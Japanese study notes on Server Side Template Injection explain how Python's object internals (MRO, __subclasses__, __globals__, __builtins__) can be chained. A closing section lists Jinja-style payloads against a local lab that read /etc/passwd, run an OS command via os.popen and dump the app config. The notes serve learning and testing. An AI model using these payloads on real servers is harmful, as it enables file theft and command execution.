## SSTI(Server Side Template Injection)

### 概要

- サーバ側で利用されるテンプレートエンジンにおいて、攻撃者が送信した文字列をテンプレート（の一部）として評価してしまう脆弱性

  - 攻撃対象となるシステム上のローカルファイルの読み込みや任意のコード実行などが可能になる
  - Black Hat USA 2015 において PortSwigger 社の James Kettle により SSTI の攻撃手法に関する報告がされている

- SSTI を効率的に行うために(Python)のオブジェクト構造について理解することは有用
  - インスタンスオブジェクトからのクラスオブジェクトの取得
    - python では任意のインスタンスオブジェクトから、対応するクラスオブジェクトを取得すつことが可能

クラスオブジェクトを取得する例

```python
i = 1
print(i.__class__) # print(type(i))と同等
```

```java
String str = "Hello";
Class clazz = str.getClass();
System.out.println(clazz);
```

- MRO:Method Resolution Order
  - メソッドの呼び出しを行う際に、特に継承されている場合において、呼び出したいメソッドがどのクラスで定義されているかを解決するために利用される機構(親クラスの一覧を取得できる機構)

```python
#! python3

import sys

class A(object):
    def func(self):
        sys.stdout.write('A')
        sys.stdout.write('\n')

class B(A):
    def func(self):
        sys.stdout.write('B')
        super().func()

class C(A):
    def func(self):
        sys.stdout.write('C')
        super().func()


class D(B, C):
    def func(self):
        sys.stdout.write('D')
        super().func()


print('MRO of A is...')
print(A.mro())
print('MRO of B is...')
print(B.mro())
print('MRO of C is...')
print(C.mro())
print('MRO of D is...')
print(D.mro())

A().func()
B().func()
C().func()
D().func()
```

- 明示的にサポートされている言語 - C++（C++11 以降）、Dylan、Eiffel、Perl（perl5）、Rust - （余談）Java などにはなぜ MRO は採用されていない？ - そもそも多重継承をサポートしていないため、MRO として別アルゴリズムとして切り出す必要がない[
  菱形継承問題](https://ja.wikipedia.org/wiki/%E8%8F%B1%E5%BD%A2%E7%B6%99%E6%89%BF%E5%95%8F%E9%A1%8C)

- サブクラスの取得
  - 自分自身を継承するサブクラスを取得できる

```python
#! python3

class A(object):
    pass

class B(A):
    pass

class C(A):
    pass

class D(B, C):
    pass

print('subclasses of A are...')
print(A.__subclasses__())
print('subclasses of B are...')
print(B.__subclasses__())
print('subclasses of C are...')
print(C.__subclasses__())
print('subclasses of D are...')
print(D.__subclasses__())
```

- 任意のインスタンスオブジェクトからのクラスオブジェクト object へのアクセス
  - ここまでの話をまとめると、MRO を用いて任意のオブジェクトから基底クラスである object を取り出し,`__subclasses__`メソッドを利用して object を直接あるいは間接的に継承する全てのクラスにアクセスすることが可能であると言える

```python
s = 'test'
print(s.__class__)
print(s.__class__.mro())
print(s.__class__.mro()[-1])
```

- `__global__`属性と、組み込み関数等を提供する builtins モジュール
  - ユーザあるいはライブラリ内で定義された関数やメソッドに付与される
  - `__global__`属性には該当関数あるいはメソッドにおいて使用できるグローバル変数一覧に対する dict オブジェクトの参照が保持される

```python
var = 1
def func():
    pass
print(func.__globals__)

```

- `__builtins__`は組み込み関数を提供している builtins モジュールへの参照(print 関数など)

```python
#! python3

class A(object):
    def func():
        pass

i = A.func.__globals__['__builtins__']
i.print("hello from __builtins__ from __globals__ from func")
```

- このように関数やメソッドにさえアクセスできれば,`__global__`属性と`__builtins__`属性を使用して組み込み関数を自由に利用できる

### 攻撃手法

http://127.0.0.1:5001/

- SSTI の検知方法

  - `{{ 1+1 }}`などのペイロードを使用し、どのように表示されるか確認してみる

- サーバ内ファイルの読み込み

  - `{{request.form.get.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
  - `{{request.form.get.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`
  - `{{ config }}`

- これらのようにサーバ内ファイルの読み込みや、OS コマンドの実行、config 情報の表示ができる
